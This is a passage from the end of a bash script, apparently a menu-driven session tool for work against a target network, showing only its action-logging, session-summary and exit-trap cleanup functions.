    record_action "Search performed for term '$TERM'"
}

print_action_summary() {
    if [[ ${#SESSION_ACTIONS[@]} -gt 0 ]]; then
        echo "Summary of actions:" | tee -a "$SESSION_LOG"
        printf ' - %s\n' "${SESSION_ACTIONS[@]}" | tee -a "$SESSION_LOG"
    else
        echo "No actions were recorded." | tee -a "$SESSION_LOG"
    fi
}

finalize_session() {
    # Ensure wrap-up runs only once (e.g., normal exit vs. trap)
    if [[ "${SESSION_FINALIZED:-0}" -eq 1 ]]; then
        return
    fi
    SESSION_FINALIZED=1

    banner "Session Summary"
    log_msg "Session ended for ${TARGET_NET:-unknown target}"
    if [[ -n "${RUN_DIR:-}" ]]; then
        echo "All outputs in: $RUN_DIR"
    fi

    dependency_summary_report
    print_action_summary
}


############
#  Main    #
############

trap finalize_session EXIT
show_menu
finalize_session
